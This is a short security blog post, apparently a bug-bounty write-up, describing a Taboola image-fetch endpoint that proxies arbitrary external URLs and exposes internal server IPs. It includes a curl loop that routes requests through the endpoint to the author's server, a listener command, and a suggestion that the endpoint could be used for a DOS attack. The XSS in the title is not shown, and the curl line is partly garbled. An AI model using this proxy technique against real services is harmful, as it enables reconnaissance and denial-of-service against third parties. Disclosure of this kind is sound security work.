# :globe_with_meridians: A juicy endpoint on the Taboola leads to reveal internal IPs and XSS

---

# A juicy endpoint on the Taboola leads to reveal internal IPs and XSS

I usually read news about security everyday, One of these websites is [ZDNet](https://www.zdnet.com/). There is an space in the bottom of the page for recommending ads by the Taboola.

As a security lover, I always take a look at everywhere I can 😁

Just right-click on ads and find a juicy endpoint by Inspect Element. An endpoint fetch pictures from the Taboola CDN.

```
[https://images.taboola.com/taboola/image/fetch/](https://images.taboola.com/taboola/image/fetch/)
```

If you insert an external URL image after this endpoint, the Taboola server will process and show the picture. The Taboola won’t check that image is whether from it’s CDN or not!

What happen If I send a request from Taboola by this endpoint to my server? So I did it and found the Taboola internal IPs.

I’ve prepared my server by the following command for listening on port 8000

```
python -m SimpleHTTPServer 8000
```

And from my PC send multiple requests to server by the following code:

```
for number in {1..100}
do curl -i [https://images.taboola.com/taboola/image/fetch/http://S](https://images.taboola.com/taboola/image/fetch/http://{target)ERVER_IP:8000/$number
done
```

And responses were amazing!!!

## Get Seqrity’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

The Taboola uses Fastly CDN and whenever you ping images.taboola.com, you will receive the following response:

```
ping images.taboola.com
PING tls13.taboola.map.fastly.net (151.101.193.44) 56(84) bytes of data.
```

But I found internal IPs from Amazon!!!

So, With this juicy endpoint you can run DOS Attack on behalf the Taboola servers.

In addition, these servers had open ports on 22 and 80 and there were two CVEs on one of them.

---
